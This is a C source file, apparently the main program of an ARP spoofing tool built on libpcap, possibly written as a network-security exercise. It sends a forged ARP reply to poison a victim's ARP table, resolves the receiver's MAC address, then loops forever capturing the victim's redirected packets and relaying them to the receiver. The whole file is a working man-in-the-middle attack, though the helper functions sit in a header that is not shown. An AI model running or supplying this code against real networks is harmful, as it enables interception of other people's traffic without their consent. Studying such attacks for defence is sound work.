#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include "arp_spoofing.h"

void usage(void) {
    printf("Usage : ./arp_spoofing <interface> <sender ip1> <target ip1> \n");
    printf("sample: ./arp_spoofing wlan0 192.168.10.2 192.168.10.1\n");
    exit(0);
}

int main(int argc, char * argv[]) {
    if (argc != 4)                // sender ip & target ip have to be paired. || max == 100 pairs
        usage();    

    const char * dev = argv[1];
                                     // interface name
    uint8_t sender_ip[4];
    str_to_ip(sender_ip, argv[2]);
    uint8_t receiver_ip[4];
    str_to_ip(receiver_ip, argv[3]);

    uint8_t my_mac[6];
    get_mac(my_mac, dev);
    uint8_t my_ip[4];
    get_ip(my_ip, dev);

    uint8_t sender_mac[6];
    uint8_t receiver_mac[6];

    u_char * hdr_buf;
    u_char * payload_buf;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

// ==========================================================================================
    printf("[+] 1. Infect victim's ARP table\n");
// ==========================================================================================
    printf("[+] 1-1. Send ARP request packet. Who is [victim's ip]\n\n");

    send_ARP_req(my_mac, my_ip, sender_ip, handle);

    printf("[+] Success! 1-1\n\n");
// ==========================================================================================
    printf("[+] 1-2. Receive ARP reply packet from victim\n\n");

    recv_ARP_rep(sender_ip, sender_mac, handle);
   
    printf("[+] Success! 1-2\n\n");
// ==========================================================================================
    printf("[+] 1-3. Send fake ARP reply packet to victim \n\n");

    send_fake_ARP_rep(sender_mac, sender_ip, my_mac, my_ip, handle);

    printf("[+] Success! 1-3\n\n");
// ==========================================================================================
    printf("[+] 2. Get Receiver's MAC\n");
// ==========================================================================================
    printf("[+] 2-1. Send ARP request packet. Who is [receiver's ip]\n\n");

    send_ARP_req(my_mac, my_ip, receiver_ip, handle);

    printf("[+] Success! 2-1\n\n");
// ==========================================================================================
    printf("[+] 2-2. Receive ARP reply packet from receiver\n\n");

    recv_ARP_rep(receiver_ip, receiver_mac, handle);
   
    printf("[+] Success! 2-2\n\n");
// ==========================================================================================
    printf("[+] 3. Spoof and Relay\n");
// ==========================================================================================
    printf("[+] 3-1. Receive spoofed packet from victim\n");
    printf("[+] 3-2. Send relay packet to receiver\n\n");

    while(1) {
        recv_spoofed_IP_pkt(sender_ip, handle, hdr_buf, payload_buf);
        send_relay_pkt(my_mac, receiver_mac, sender_ip, receiver_ip, handle, hdr_buf, payload_buf);
    }
// ==========================================================================================


    return 0;
}